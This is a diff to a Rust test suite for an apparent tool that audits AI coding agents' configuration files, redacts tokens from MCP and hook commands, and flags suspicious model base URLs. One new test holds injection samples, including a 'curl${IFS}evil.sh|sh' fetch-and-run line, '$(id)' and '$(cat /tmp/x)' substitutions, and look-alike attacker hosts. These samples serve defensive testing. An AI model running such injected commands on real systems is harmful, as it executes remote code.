@@ -24,7 +24,7 @@ fn write(root: &Path, path: &str, text: &str) {
 /// What the agents' configuration under `root` gives, for the home
 /// `home/u` with the default directories.
 fn found_in(root: &Path) -> Found {
-    found_with(root, &Dirs::new("home/u", &|_| None, None))
+    found_with(root, &Dirs::new("home/u", &Variables::default(), None))
 }
 
 /// What the agents' configuration under `root` gives, read from `dirs`.
@@ -178,14 +178,14 @@ fn claude_json_gives_only_its_servers_and_hides_projects_and_secrets() {
         }"#,
     );
     let key = ProjectKey(Sha256::digest(b"a key"));
-    let found = found_with(root, &Dirs::new("home/u", &|_| None, Some(key)));
+    let found = found_with(root, &Dirs::new("home/u", &Variables::default(), Some(key)));
     assert_eq!(found.unchecked, Vec::<String>::new());
 
     let github = at(&found, "home/u/.claude.json#mcpServers/github");
     assert_eq!(
         text(github),
         "# started with these variables set (values not read): GITHUB_TOKEN LD_PRELOAD\n\
-         docker run -e GITHUB_TOKEN=<value-not-read> --api-key <value-not-read> \
+         docker run -e GITHUB_TOKEN=<redacted-by-guardian> --api-key <redacted-by-guardian> \
          --url=https://api.example.com/v1 'image name'\n"
     );
     let docs = at(&found, "home/u/.claude.json#mcpServers/docs");
@@ -218,7 +218,7 @@ fn claude_json_gives_only_its_servers_and_hides_projects_and_secrets() {
     assert_eq!(text(project), "uvx db-server\n");
     assert_eq!(
         project.notes,
-        ["an MCP server of the project /home/u/work/secret-project"]
+        ["an MCP server of one of Claude Code's projects"]
     );
 
     for item in &found.items {
@@ -623,7 +623,7 @@ fn the_sweep_follows_what_a_hook_and_a_plugin_run() {
 
 #[test]
 fn the_environment_moves_each_agents_directory() {
-    let defaults = Dirs::new("home/u", &|_| None, None);
+    let defaults = Dirs::new("home/u", &Variables::default(), None);
     assert_eq!(
         defaults,
         Dirs {
@@ -636,23 +636,14 @@ fn the_environment_moves_each_agents_directory() {
             project_key: None,
         }
     );
-    let moved = Dirs::new(
-        "home/u",
-        &|name| {
-            Some(
-                match name {
-                    "CLAUDE_CONFIG_DIR" => "srv/claude",
-                    "XDG_CONFIG_HOME" => "home/u/conf",
-                    "OPENCODE_CONFIG_DIR" => "home/u/oc",
-                    "OPENCODE_CONFIG" => "home/u/oc.json",
-                    "CODEX_HOME" => "opt/codex",
-                    other => panic!("asked for {other}"),
-                }
-                .to_string(),
-            )
-        },
-        None,
-    );
+    let variables = Variables {
+        claude_config_dir: Some("srv/claude".into()),
+        xdg_config_home: Some("home/u/conf".into()),
+        opencode_config_dir: Some("home/u/oc".into()),
+        opencode_config: Some("home/u/oc.json".into()),
+        codex_home: Some("opt/codex".into()),
+    };
+    let moved = Dirs::new("home/u", &variables, None);
     assert_eq!(
         moved,
         Dirs {
@@ -673,20 +664,26 @@ fn the_environment_moves_each_agents_directory() {
 
 #[test]
 fn a_variable_set_to_no_plain_path_is_said_and_the_default_read() {
-    let lookup = |name: &str| match name {
-        "CLAUDE_CONFIG_DIR" => Some(Some("relative/claude".to_string())),
-        "XDG_CONFIG_HOME" => Some(None),
-        "OPENCODE_CONFIG" => Some(Some("/a/../b.json".to_string())),
-        "CODEX_HOME" => Some(Some("/opt/codex/".to_string())),
-        _ => None,
-    };
+    use std::os::unix::ffi::OsStringExt as _;
+
     let mut found = Found::default();
-    let variable = resolved(&lookup, &mut found);
-    let dirs = Dirs::new("home/u", &variable, None);
-    assert_eq!(dirs.claude, "home/u/.claude");
-    assert_eq!(dirs.opencode, "home/u/.config/opencode");
-    assert_eq!(dirs.opencode_config, None);
-    assert_eq!(dirs.codex, "opt/codex");
+    let os = |text: &str| Some(OsString::from(text));
+    assert_eq!(
+        checked("CODEX_HOME", os("/opt/codex/"), &mut found).as_deref(),
+        Some("opt/codex")
+    );
+    assert_eq!(checked("CODEX_HOME", None, &mut found), None);
+    assert_eq!(found.unchecked, Vec::<String>::new());
+    assert_eq!(
+        checked("CLAUDE_CONFIG_DIR", os("relative/claude"), &mut found),
+        None
+    );
+    let not_utf8 = Some(OsString::from_vec(vec![b'/', 0xff]));
+    assert_eq!(checked("XDG_CONFIG_HOME", not_utf8, &mut found), None);
+    assert_eq!(
+        checked("OPENCODE_CONFIG", os("/a/../b.json"), &mut found),
+        None
+    );
     let said: Vec<&str> = found
         .unchecked
         .iter()
@@ -697,6 +694,26 @@ fn a_variable_set_to_no_plain_path_is_said_and_the_default_read() {
         ["CLAUDE_CONFIG_DIR", "XDG_CONFIG_HOME", "OPENCODE_CONFIG"]
     );
     assert!(found.unchecked[0].ends_with("was not checked"));
+}
+
+#[test]
+fn the_root_checks_read_the_defaults_and_write_no_key() {
+    let dir = TempDir::new("agents-root-dirs");
+    let index = PackageIndex::with_foreign(HashSet::new());
+    // The home of the user running the tests, which would read its
+    // environment and keep a key, were the checks not root's.
+    let own = env::var("HOME").unwrap_or_default();
+    let home = own.trim_matches('/');
+    let scope = Scope {
+        root: dir.path(),
+        home: Some(home),
+        index: &index,
+        origin: Origin::Root,
+    };
+    let mut found = Found::default();
+    let dirs = Dirs::of(&scope, &mut found).unwrap();
+    assert_eq!(dirs, Dirs::new(home, &Variables::default(), None));
+    assert_eq!(found.unchecked, Vec::<String>::new());
 }
 
 #[test]
@@ -713,7 +730,7 @@ fn a_home_that_is_not_the_users_own_reads_the_defaults_without_a_key() {
     };
     let mut found = Found::default();
     let dirs = Dirs::of(&scope, &mut found).unwrap();
-    assert_eq!(dirs, Dirs::new(home, &|_| None, None));
+    assert_eq!(dirs, Dirs::new(home, &Variables::default(), None));
     assert_eq!(found.unchecked, Vec::<String>::new());
     let no_home = Scope {
         home: None,
@@ -773,11 +790,11 @@ fn a_line_loses_its_secrets_and_keeps_what_a_review_needs() {
     for (line, expected) in [
         (
             "x --password p --keymap k --auth-token=t",
-            "x --password <value-not-read> --keymap k --auth-token=<value-not-read>",
+            "x --password <redacted-by-guardian> --keymap k --auth-token=<redacted-by-guardian>",
         ),
         (
             "x --authToken t --clientSecret 's'",
-            "x --authToken <value-not-read> --clientSecret '<value-not-read>'",
+            "x --authToken <redacted-by-guardian> --clientSecret '<redacted-by-guardian>'",
         ),
         (
             "x --api-key $KEY --token-file ~/.t",
@@ -785,26 +802,29 @@ fn a_line_loses_its_secrets_and_keeps_what_a_review_needs() {
         ),
         (
             r#"curl -H "Authorization: Bearer abc" -H 'authorization:token xyz' u"#,
-            r#"curl -H "Authorization: Bearer <value-not-read>" -H 'authorization:token <value-not-read>' u"#,
+            r#"curl -H "Authorization: Bearer <redacted-by-guardian>" -H 'authorization:token <redacted-by-guardian>' u"#,
         ),
         (
             "curl -H 'Authorization: token xyz' -H 'Authorization:abc' u",
-            "curl -H 'Authorization: token <value-not-read>' -H 'Authorization:<value-not-read>' u",
+            "curl -H 'Authorization: token <redacted-by-guardian>' -H 'Authorization:<redacted-by-guardian>' u",
         ),
         (
             "curl --oauth2-bearer abc u",
-            "curl --oauth2-bearer <value-not-read> u",
+            "curl --oauth2-bearer <redacted-by-guardian> u",
         ),
-        ("x Bearer abc", "x Bearer <value-not-read>"),
+        ("x Bearer abc", "x Bearer <redacted-by-guardian>"),
         (
             "docker run --env=API_KEY=k -e GITHUB_TOKEN=g --env=REGION=eu",
-            "docker run --env=API_KEY=<value-not-read> -e GITHUB_TOKEN=<value-not-read> --env=REGION=eu",
+            "docker run --env=API_KEY=<redacted-by-guardian> -e GITHUB_TOKEN=<redacted-by-guardian> --env=REGION=eu",
         ),
         (
             "echo sk-ant-api03-abcdefghijklmnop",
-            "echo <value-not-read>",
+            "echo <redacted-by-guardian>",
         ),
-        ("x aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF", "x <value-not-read>"),
+        (
+            "x aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF",
+            "x <redacted-by-guardian>",
+        ),
         (
             "x 0123456789abcdef0123456789abcdef sk-learn",
             "x 0123456789abcdef0123456789abcdef sk-learn",
@@ -1026,7 +1046,6 @@ fn a_claude_field_that_is_there_and_cannot_be_read_is_said_as_not_checked() {
             said(settings, "command of apiKeyHelper"),
             said(settings, "table of env"),
             said(settings, "command of mcpServers/s"),
-            said(settings, "args of mcpServers/s"),
             said(settings, "url of mcpServers/s"),
             said(settings, "headersHelper of mcpServers/s"),
             said(settings, "env of mcpServers/s"),
@@ -1045,6 +1064,7 @@ fn helpers_and_hooks_lose_their_secrets_before_they_are_items() {
         "home/u/.claude/settings.json",
         r#"{
           "apiKeyHelper": "echo sk-ant-api03-abcdefghijklmnopqrstuvwxyz",
+          "gcpAuthRefresh": "gcloud auth login",
           "statusLine": {"command": "status --token t-1 --style x"},
           "hooks": {"Stop": [{"hooks": [
             {"command": "curl -H 'Authorization: Bearer b-1' https://h.example/x"}
@@ -1060,28 +1080,40 @@ fn helpers_and_hooks_lose_their_secrets_before_they_are_items() {
     let file = "home/u/.claude/settings.json";
     assert_eq!(
         text(at(&found, &format!("{file}#apiKeyHelper"))),
-        "echo <value-not-read>\n"
+        "echo <redacted-by-guardian>\n"
     );
     assert_eq!(
         text(at(&found, &format!("{file}#statusLine"))),
-        "status --token <value-not-read> --style x\n"
+        "status --token <redacted-by-guardian> --style x\n"
+    );
+    assert_eq!(
+        at(&found, &format!("{file}#gcpAuthRefresh")).runs,
+        ["gcloud auth login"]
     );
     let hook = at(&found, &format!("{file}#hooks/Stop/0/0"));
     assert_eq!(
         text(hook),
-        "curl -H 'Authorization: Bearer <value-not-read>' https://h.example/x\n"
+        "curl -H 'Authorization: Bearer <redacted-by-guardian>' https://h.example/x\n"
     );
-    // What is followed is the command as written, read only here.
-    assert_eq!(
-        hook.runs,
-        ["curl -H 'Authorization: Bearer b-1' https://h.example/x"]
-    );
+    // What runs is shown in the output and saved reports: no secret there.
+    assert_eq!(hook.runs, [text(hook).trim_end()]);
     let helper = at(&found, &format!("{file}#mcpServers/remote/headersHelper"));
     assert_eq!(
         text(helper),
-        "/home/u/bin/headers --secret <value-not-read>\n"
+        "/home/u/bin/headers --secret <redacted-by-guardian>\n"
     );
-    assert_eq!(helper.runs, ["/home/u/bin/headers --secret s-1"]);
+    assert_eq!(
+        helper.runs,
+        ["/home/u/bin/headers --secret <redacted-by-guardian>"]
+    );
+    for item in &found.items {
+        for secret in ["sk-ant-api03", "t-1", "b-1", "s-1"] {
+            assert!(
+                item.runs.iter().all(|run| !run.contains(secret)),
+                "{secret}"
+            );
+        }
+    }
     at(&found, &format!("{file}#mcpServers/remote"));
 }
 
@@ -1172,7 +1204,10 @@ fn without_a_key_a_project_is_named_by_its_position() {
     );
     let found = found_in(root);
     let project = at(&found, "home/u/.claude.json#projects/1/mcpServers/db");
-    assert_eq!(project.notes, ["an MCP server of the project /home/u/b"]);
+    assert_eq!(
+        project.notes,
+        ["an MCP server of one of Claude Code's projects"]
+    );
 }
 
 #[test]
@@ -1254,12 +1289,12 @@ fn opencode_reads_the_directory_and_file_its_variables_name_once() {
         "home/u/.config/opencode/opencode.json",
         r#"{"mcp": {"b": {"type": "local", "command": ["b-mcp"]}}}"#,
     );
-    let variable = |name: &str| match name {
-        "OPENCODE_CONFIG_DIR" => Some("home/u/oc".to_string()),
-        "OPENCODE_CONFIG" => Some("home/u/.config/opencode/opencode.json".to_string()),
-        _ => None,
+    let variables = Variables {
+        opencode_config_dir: Some("home/u/oc".into()),
+        opencode_config: Some("home/u/.config/opencode/opencode.json".into()),
+        ..Variables::default()
     };
-    let found = found_with(root, &Dirs::new("home/u", &variable, None));
+    let found = found_with(root, &Dirs::new("home/u", &variables, None));
     let mut paths: Vec<&str> = found.items.iter().map(|item| item.path.as_str()).collect();
     paths.sort_unstable();
     assert_eq!(
@@ -1269,5 +1304,99 @@ fn opencode_reads_the_directory_and_file_its_variables_name_once() {
             "home/u/oc/opencode.json#mcp/a",
             "home/u/oc/plugin/x.js",
         ]
+    );
+}
+
+#[test]
+fn what_could_be_code_is_never_taken_out() {
+    for line in [
+        "env TOKEN=x;curl${IFS}evil.sh|sh",
+        "srv --api-key x;sh${IFS}-c${IFS}id",
+        "curl -H Authorization:x;sh${IFS}-c${IFS}id u",
+        "curl -H 'Authorization: Bearer $(cat /tmp/x)' u",
+        "curl https://a$(id)b@h.example/x",
+    ] {
+        assert_eq!(redacted(line), line);
+    }
+}
+
+#[test]
+fn a_base_address_is_the_providers_only_at_its_exact_api_host() {
+    let alerted = |url: &str| {
+        let variable = entry::Variable::of("ANTHROPIC_BASE_URL", url);
+        let dir = TempDir::new("agents-provider");
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let scope = Scope {
+            root: dir.path(),
+            home: Some("home/u"),
+            index: &index,
+            origin: Origin::System,
+        };
+        let mut entries = Entries::default();
+        entries.push(Entry {
+            key: "env".into(),
+            launch: Launch::Environment(vec![variable]),
+            variables: Vec::new(),
+        });
+        let mut found = Found::default();
+        add(&scope, &Source::of("home/u/s.json"), entries, &mut found);
+        !found.items[0].alerts.is_empty()
+    };
+    for provider in [
+        "https://api.anthropic.com",
+        "https://api.openai.com/v1",
+        "https://bedrock-runtime.us-east-1.amazonaws.com",
+        "https://us-east5-aiplatform.googleapis.com",
+        "https://aiplatform.googleapis.com",
+        "https://aiplatform.eu.rep.googleapis.com",
+        "https://team.openai.azure.com",
+        "https://team.services.ai.azure.com/anthropic",
+        "http://127.0.0.1:8080",
+    ] {
+        assert!(!alerted(provider), "{provider}");
+    }
+    for elsewhere in [
+        "https://evil.amazonaws.com",
+        "https://bucket.s3.amazonaws.com",
+        "https://x.cloudfunctions.googleapis.com",
+        "https://site.azurewebsites.net",
+        "https://a.b.openai.azure.com",
+        "https://anthropic.com.evil.example",
+        "https://claude.ai",
+    ] {
+        assert!(alerted(elsewhere), "{elsewhere}");
+    }
+}
+
+#[test]
+fn odd_servers_and_addresses_are_said_or_start_nothing() {
+    let dir = TempDir::new("agents-odd-servers");
+    let root = dir.path();
+    write(
+        root,
+        "home/u/.claude.json",
+        r#"{"mcpServers": {"args-only": {"args": ["x"]}, "five": 5}}"#,
+    );
+    write(
+        root,
+        "home/u/.claude/settings.json",
+        r#"{"env": {"ANTHROPIC_BASE_URL": 5, "HTTPS_PROXY": "", "N": 1}}"#,
+    );
+    let found = found_in(root);
+    let said = |file: &str, what: &str| {
+        format!("/home/u/{file}: the {what} could not be read; what it starts was not checked")
+    };
+    assert_eq!(
+        found.unchecked,
+        [
+            said(".claude/settings.json", "value of env/ANTHROPIC_BASE_URL"),
+            said(".claude.json", "table of mcpServers/five"),
+        ]
+    );
+    let paths: Vec<&str> = found.items.iter().map(|item| item.path.as_str()).collect();
+    assert_eq!(paths, ["home/u/.claude/settings.json#env"]);
+    assert_eq!(
+        text(&found.items[0]).lines().skip(1).collect::<Vec<_>>(),
+        ["ANTHROPIC_BASE_URL", "HTTPS_PROXY", "N"]
     );
 }
